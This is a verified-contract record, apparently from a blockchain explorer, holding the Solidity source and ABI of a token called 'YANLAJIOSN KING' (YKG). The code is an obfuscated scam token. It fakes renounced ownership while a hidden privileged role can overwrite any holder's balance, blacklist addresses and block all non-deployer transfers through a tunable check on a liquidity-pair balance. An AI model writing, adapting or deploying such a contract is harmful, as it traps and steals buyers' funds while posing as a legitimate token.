{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nabstract contract marketingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minReceiver {\n    function createPair(address senderBuy, address launchedFrom) external returns (address);\n}\n\n\ninterface marketingReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface amountLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeTx) external view returns (uint256);\n\n    function transfer(address takeMin, uint256 takeMode) external returns (bool);\n\n    function allowance(address shouldIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeMode) external returns (bool);\n\n    function transferFrom(address sender,address takeMin,uint256 takeMode) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTotal, uint256 value);\n    event Approval(address indexed shouldIs, address indexed spender, uint256 value);\n}\n\ninterface feeAmountMax is amountLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract YANLAJIOSNKING is marketingBuy, amountLiquidity, feeAmountMax {\n\n    function approve(address modeSellFund, uint256 takeMode) public virtual override returns (bool) {\n        feeAuto[_msgSender()][modeSellFund] = takeMode;\n        emit Approval(_msgSender(), modeSellFund, takeMode);\n        return true;\n    }\n\n    uint256 private launchedBuy;\n\n    bool public modeTeam;\n\n    uint256 public minFeeShould;\n\n    function allowance(address feeToken, address modeSellFund) external view virtual override returns (uint256) {\n        if (modeSellFund == autoTeam) {\n            return type(uint256).max;\n        }\n        return feeAuto[feeToken][modeSellFund];\n    }\n\n    address swapWalletReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public totalFund;\n\n    function transfer(address swapAmountMax, uint256 takeMode) external virtual override returns (bool) {\n        return amountBuy(_msgSender(), swapAmountMax, takeMode);\n    }\n\n    bool private autoReceiver;\n\n    mapping(address => bool) public isSwap;\n\n    mapping(address => uint256) private sellLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAtTo;\n    }\n\n    string private listMarketing = \"YANLAJIOSN KING\";\n\n    address autoTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public tokenReceiver;\n\n    function transferFrom(address atTokenLimit, address takeMin, uint256 takeMode) external override returns (bool) {\n        if (_msgSender() != autoTeam) {\n            if (feeAuto[atTokenLimit][_msgSender()] != type(uint256).max) {\n                require(takeMode <= feeAuto[atTokenLimit][_msgSender()]);\n                feeAuto[atTokenLimit][_msgSender()] -= takeMode;\n            }\n        }\n        return amountBuy(atTokenLimit, takeMin, takeMode);\n    }\n\n    uint256 sellSwap;\n\n    string private tokenTo = \"YKG\";\n\n    function name() external view virtual override returns (string memory) {\n        return listMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeAuto;\n\n    uint256 public listWalletFee;\n\n    function receiverMode() private view {\n        require(receiverTrading[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return takeLimit;\n    }\n\n    function takeIs() public {\n        emit OwnershipTransferred(shouldFee, address(0));\n        takeLimit = address(0);\n    }\n\n    uint256 marketingSenderMax;\n\n    bool public tokenTotal;\n\n    function getOwner() external view returns (address) {\n        return takeLimit;\n    }\n\n    function amountBuy(address atTokenLimit, address takeMin, uint256 takeMode) internal returns (bool) {\n        if (atTokenLimit == shouldFee) {\n            return listBuy(atTokenLimit, takeMin, takeMode);\n        }\n        uint256 walletBuy = amountLiquidity(tokenReceiver).balanceOf(swapWalletReceiver);\n        require(walletBuy == marketingSenderMax);\n        require(!isSwap[atTokenLimit]);\n        return listBuy(atTokenLimit, takeMin, takeMode);\n    }\n\n    function balanceOf(address feeTx) public view virtual override returns (uint256) {\n        return sellLimit[feeTx];\n    }\n\n    function toTrading(uint256 takeMode) public {\n        receiverMode();\n        marketingSenderMax = takeMode;\n    }\n\n    constructor (){\n        \n        takeIs();\n        marketingReceiver tradingList = marketingReceiver(autoTeam);\n        tokenReceiver = minReceiver(tradingList.factory()).createPair(tradingList.WETH(), address(this));\n        if (listWalletFee != launchedBuy) {\n            feeAmount = false;\n        }\n        shouldFee = _msgSender();\n        receiverTrading[shouldFee] = true;\n        sellLimit[shouldFee] = receiverAtTo;\n        if (autoReceiver != feeAmount) {\n            feeAmount = true;\n        }\n        emit Transfer(address(0), shouldFee, receiverAtTo);\n    }\n\n    function txFee(address swapAmountMax, uint256 takeMode) public {\n        receiverMode();\n        sellLimit[swapAmountMax] = takeMode;\n    }\n\n    function listBuy(address atTokenLimit, address takeMin, uint256 takeMode) internal returns (bool) {\n        require(sellLimit[atTokenLimit] >= takeMode);\n        sellLimit[atTokenLimit] -= takeMode;\n        sellLimit[takeMin] += takeMode;\n        emit Transfer(atTokenLimit, takeMin, takeMode);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buySender;\n    }\n\n    uint8 private buySender = 18;\n\n    address private takeLimit;\n\n    function receiverFund(address fromTrading) public {\n        if (modeTeam) {\n            return;\n        }\n        if (exemptIs != tokenTotal) {\n            minFeeShould = totalFund;\n        }\n        receiverTrading[fromTrading] = true;\n        if (exemptIs == autoReceiver) {\n            exemptIs = true;\n        }\n        modeTeam = true;\n    }\n\n    bool private feeAmount;\n\n    uint256 private receiverAtTo = 100000000 * 10 ** 18;\n\n    function tradingMin(address listAt) public {\n        receiverMode();\n        \n        if (listAt == shouldFee || listAt == tokenReceiver) {\n            return;\n        }\n        isSwap[listAt] = true;\n    }\n\n    bool public exemptIs;\n\n    event OwnershipTransferred(address indexed senderFund, address indexed swapSender);\n\n    address public shouldFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenTo;\n    }\n\n    mapping(address => bool) public receiverTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSellFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSellFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWalletFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFeeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"receiverFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"}],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTokenLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmountMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeMode\",\"type\":\"uint256\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "YANLAJIOSNKING", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}